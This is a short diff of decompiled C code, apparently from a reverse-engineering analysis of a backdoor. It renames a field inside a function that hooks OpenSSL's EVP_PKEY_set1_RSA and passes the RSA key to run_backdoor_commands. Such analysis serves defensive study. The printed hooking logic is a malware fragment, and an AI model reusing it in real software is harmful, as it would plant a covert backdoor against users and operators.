@@ -20,7 +20,7 @@ int hook_EVP_PKEY_set1_RSA(EVP_PKEY *pkey,RSA *key)
   
   if (((global_ctx != (global_context_t *)0x0) &&
       (global_ctx->imported_funcs != (imported_funcs_t *)0x0)) &&
-     (orig_EVP_PKEY_set1_RSA = global_ctx->imported_funcs->EVP_PKEY_set1_RSA,
+     (orig_EVP_PKEY_set1_RSA = global_ctx->imported_funcs->EVP_PKEY_set1_RSA_orig,
      orig_EVP_PKEY_set1_RSA != (pfn_EVP_PKEY_set1_RSA_t)0x0)) {
     if (key != (RSA *)0x0) {
       run_backdoor_commands(key,global_ctx,&call_orig);
